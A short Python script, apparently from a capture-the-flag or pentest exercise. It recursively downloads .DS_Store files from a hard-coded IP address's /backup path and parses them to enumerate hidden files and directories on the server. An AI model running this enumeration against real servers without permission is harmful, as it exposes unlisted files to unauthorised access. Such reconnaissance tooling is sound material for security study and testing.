import requests
from ds_store import DSStore
# set([x.filename for x in list(DSStore.open('storeb'))])

BASE = 'http://35.207.91.38/backup'  # /b/a/.DS_Store'

def f(url):
    res = requests.get('/'.join([url, '.DS_Store']))
    if res.status_code != 200:
        print('no match: ', url)
        return
    open('/tmp/f', 'wb').write(res.content)
    for fn in set([x.filename for x in list(DSStore.open('/tmp/f'))]):
        f('/'.join([url, fn]))
    

f(BASE)
